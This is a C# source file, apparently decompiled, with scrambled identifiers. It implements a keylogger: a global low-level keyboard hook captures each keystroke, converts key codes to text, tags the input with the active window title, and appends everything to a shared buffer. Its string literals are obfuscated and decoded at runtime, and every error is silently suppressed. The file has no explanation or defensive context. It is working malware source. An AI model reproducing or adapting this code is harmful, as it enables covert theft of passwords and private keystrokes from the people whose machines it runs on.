using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

public class XNNKMUW
{
	private delegate int KeyboardHookDelegate(int Code, int wParam, ref GGCPMIP lParam);

	public struct GGCPMIP
	{
		public int BLCNOWM;

		public int GYILXLT;

		public int DGUCGCG;

		public int KRPWTQS;

		public int YHIPXXS;
	}

	private string output;

	private static IntPtr CKBRMSLK = (IntPtr)0;

	private static string UTOJDOLJ = "";

	private static KeyboardHookDelegate SNKQDGT = null;

	public static string SUJFRQW(IntPtr hWnd)
	{
		string result = default(string);
		try
		{
			if (hWnd.ToInt32() <= 0)
			{
				result = null;
				return result;
			}
			int windowTextLength = GetWindowTextLength(hWnd);
			if (windowTextLength == 0)
			{
				result = null;
				return result;
			}
			StringBuilder stringBuilder = new StringBuilder(checked(windowTextLength + 1));
			GetWindowTextA((int)hWnd, stringBuilder, stringBuilder.Capacity);
			result = stringBuilder.ToString().Trim();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static bool UGWUEDC()
	{
		bool result = default(bool);
		try
		{
			result = CKBRMSLK != (IntPtr)0;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void PYEWXKY()
	{
		try
		{
			SNKQDGT = KYBRDLCK;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			CKBRMSLK = (IntPtr)SetWindowsHookExA(13, SNKQDGT, (int)Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void QPNRCIRS()
	{
		try
		{
			if (UGWUEDC() && UnhookWindowsHookEx((int)CKBRMSLK) != 0)
			{
				CKBRMSLK = (IntPtr)0;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int UnhookWindowsHookEx(int hHook);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(int vKey);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowsHookExA(int idHook, KeyboardHookDelegate lpfn, int hmod, int dwThreadId);

	public static int KYBRDLCK(int Code, int WPA, ref GGCPMIP LPA)
	{
		try
		{
			string text = SUJFRQW(GetForegroundWindow());
			if (Operators.CompareString(text, UTOJDOLJ, false) != 0)
			{
				UTOJDOLJ = text;
				LOIFDUM.MHGSSER = LOIFDUM.MHGSSER + Environment.NewLine + EHMIWRQ.VIJVUUV("n5mXnpBxjAQ=", "False") + " " + text + " " + EHMIWRQ.VIJVUUV("aIOOlYd1sw0=", "False") + Environment.NewLine + Environment.NewLine;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		int result = default(int);
		try
		{
			Thread.Sleep(10);
			string text2 = "";
			if (WPA == 256 || WPA == 260)
			{
				checked
				{
					switch (LPA.BLCNOWM)
					{
					case 8:
						LOIFDUM.MHGSSER = LOIFDUM.MHGSSER.Substring(0, LOIFDUM.MHGSSER.Length - 1);
						break;
					case 9:
						text2 = char.ConvertFromUtf32(9);
						break;
					case 13:
						text2 = Environment.NewLine;
						break;
					case 18:
						text2 = EHMIWRQ.VIJVUUV("W7Gi1M6Ydg0=", "False");
						break;
					case 20:
						text2 = ((!Control.IsKeyLocked((Keys)20)) ? EHMIWRQ.VIJVUUV("Q5mMkZJ2XpWfhW5emJ6fQyQ=", "False") : EHMIWRQ.VIJVUUV("QpiLkJF1XZSehG1dl5WHf10m", "False"));
						break;
					case 27:
						text2 = EHMIWRQ.VIJVUUV("S6GWy62IZh0=", "False");
						break;
					case 32:
						text2 = EHMIWRQ.VIJVUUV("RyA=", "False");
						break;
					case 33:
						text2 = EHMIWRQ.VIJVUUV("Zbu708uqtdvPhAE=", "False");
						break;
					case 34:
						text2 = EHMIWRQ.VIJVUUV("VKqqwrqZk8nYwZFvFA==", "False");
						break;
					case 35:
						text2 = EHMIWRQ.VIJVUUV("R52SwqqEYiE=", "False");
						break;
					case 36:
						text2 = EHMIWRQ.VIJVUUV("WrCo1safsoAP", "False");
						break;
					case 37:
						text2 = EHMIWRQ.VIJVUUV("U6mVvXIT", "False");
						break;
					case 38:
						text2 = EHMIWRQ.VIJVUUV("SJ6ssmce", "False");
						break;
					case 39:
						text2 = EHMIWRQ.VIJVUUV("X7WjyX4H", "False");
						break;
					case 40:
						text2 = EHMIWRQ.VIJVUUV("O5GXpVor", "False");
						break;
					case 46:
						text2 = EHMIWRQ.VIJVUUV("WrCkzMWXdQ4=", "False");
						break;
					case 48:
					case 49:
					case 50:
					case 51:
					case 52:
					case 53:
					case 54:
					case 55:
					case 56:
					case 57:
						if (((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown())
						{
							string text3 = EHMIWRQ.VIJVUUV("YnynjoNhgIeTgJ98jY6KYYSHlwk=", "False");
							string[] array = text3.Split(new char[1] { Conversions.ToChar(EHMIWRQ.VIJVUUV("VBM=", "False")) });
							switch (LPA.BLCNOWM)
							{
							case 48:
								text2 = array[9];
								break;
							case 49:
								text2 = array[0];
								break;
							case 50:
								text2 = array[1];
								break;
							case 51:
								text2 = array[2];
								break;
							case 52:
								text2 = array[3];
								break;
							case 53:
								text2 = array[4];
								break;
							case 54:
								text2 = array[5];
								break;
							case 55:
								text2 = array[6];
								break;
							case 56:
								text2 = array[7];
								break;
							case 57:
								text2 = array[8];
								break;
							}
						}
						else
						{
							text2 = char.ConvertFromUtf32(LPA.BLCNOWM);
						}
						break;
					case 65:
					case 66:
					case 67:
					case 68:
					case 69:
					case 70:
					case 71:
					case 72:
					case 73:
					case 74:
					case 75:
					case 76:
					case 77:
					case 78:
					case 79:
					case 80:
					case 81:
					case 82:
					case 83:
					case 84:
					case 85:
					case 86:
					case 87:
					case 88:
					case 89:
					case 90:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? char.ConvertFromUtf32(LPA.BLCNOWM + 32).ToLower() : char.ConvertFromUtf32(LPA.BLCNOWM + 32).ToUpper());
						break;
					case 91:
					case 92:
						text2 = EHMIWRQ.VIJVUUV("Q5mgubBls73EsZGbaSY=", "False");
						break;
					case 96:
						text2 = EHMIWRQ.VIJVUUV("dQI=", "False");
						break;
					case 97:
						text2 = EHMIWRQ.VIJVUUV("Wx0=", "False");
						break;
					case 98:
						text2 = EHMIWRQ.VIJVUUV("ZhM=", "False");
						break;
					case 99:
						text2 = EHMIWRQ.VIJVUUV("SjA=", "False");
						break;
					case 100:
						text2 = EHMIWRQ.VIJVUUV("TC8=", "False");
						break;
					case 101:
						text2 = EHMIWRQ.VIJVUUV("VCg=", "False");
						break;
					case 102:
						text2 = EHMIWRQ.VIJVUUV("WyI=", "False");
						break;
					case 103:
						text2 = EHMIWRQ.VIJVUUV("dQk=", "False");
						break;
					case 104:
						text2 = EHMIWRQ.VIJVUUV("Vyg=", "False");
						break;
					case 105:
						text2 = EHMIWRQ.VIJVUUV("dwk=", "False");
						break;
					case 112:
					case 113:
					case 114:
					case 115:
					case 116:
					case 117:
					case 118:
					case 119:
					case 120:
					case 121:
					case 122:
					case 123:
					case 124:
					case 125:
					case 126:
					case 127:
					case 128:
					case 129:
					case 130:
					case 131:
					case 132:
					case 133:
					case 134:
					case 135:
						text2 = EHMIWRQ.VIJVUUV("UaedGA==", "False") + Conversions.ToString(LPA.BLCNOWM - 111) + EHMIWRQ.VIJVUUV("o4EC", "False");
						break;
					case 144:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_NumLock()) ? EHMIWRQ.VIJVUUV("ZLq45tCQzs3cg5PNx5EG", "False") : EHMIWRQ.VIJVUUV("SZ+dy7V1s7LBaHiqtbNoHQ==", "False"));
						break;
					case 16:
					case 160:
					case 161:
						text2 = "";
						break;
					case 162:
					case 163:
						text2 = EHMIWRQ.VIJVUUV("Vaue0cKpwsrOsVUS", "False");
						break;
					case 164:
					case 165:
						text2 = EHMIWRQ.VIJVUUV("RJqLvbeBXyQ=", "False");
						break;
					case 186:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? EHMIWRQ.VIJVUUV("cBI=", "False") : EHMIWRQ.VIJVUUV("axY=", "False"));
						break;
					case 187:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? EHMIWRQ.VIJVUUV("WSs=", "False") : EHMIWRQ.VIJVUUV("bAY=", "False"));
						break;
					case 188:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? EHMIWRQ.VIJVUUV("YhE=", "False") : EHMIWRQ.VIJVUUV("XCc=", "False"));
						break;
					case 189:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? EHMIWRQ.VIJVUUV("cAQ=", "False") : EHMIWRQ.VIJVUUV("eC4=", "False"));
						break;
					case 190:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? EHMIWRQ.VIJVUUV("ZRA=", "False") : EHMIWRQ.VIJVUUV("bRg=", "False"));
						break;
					case 191:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? EHMIWRQ.VIJVUUV("aQ0=", "False") : EHMIWRQ.VIJVUUV("gQU=", "False"));
						break;
					case 192:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? EHMIWRQ.VIJVUUV("lBM=", "False") : EHMIWRQ.VIJVUUV("vQg=", "False"));
						break;
					default:
						text2 = "";
						break;
					case 219:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? EHMIWRQ.VIJVUUV("mgg=", "False") : EHMIWRQ.VIJVUUV("wAI=", "False"));
						break;
					case 220:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? EHMIWRQ.VIJVUUV("czA=", "False") : EHMIWRQ.VIJVUUV("vwQ=", "False"));
						break;
					case 221:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? EHMIWRQ.VIJVUUV("gSM=", "False") : EHMIWRQ.VIJVUUV("rBg=", "False"));
						break;
					case 222:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? EHMIWRQ.VIJVUUV("bQE=", "False") : EHMIWRQ.VIJVUUV("Ths=", "False"));
						break;
					}
					LOIFDUM.MHGSSER += text2;
					LOIFDUM.WEWRTGQP = LOIFDUM.MHGSSER;
					return result;
				}
			}
			return result;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("user32.dll", SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int GetWindowTextLength(IntPtr hwnd);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(int hwnd, StringBuilder lpString, int cch);

	public XNNKMUW(string output)
	{
		try
		{
			this.output = output;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
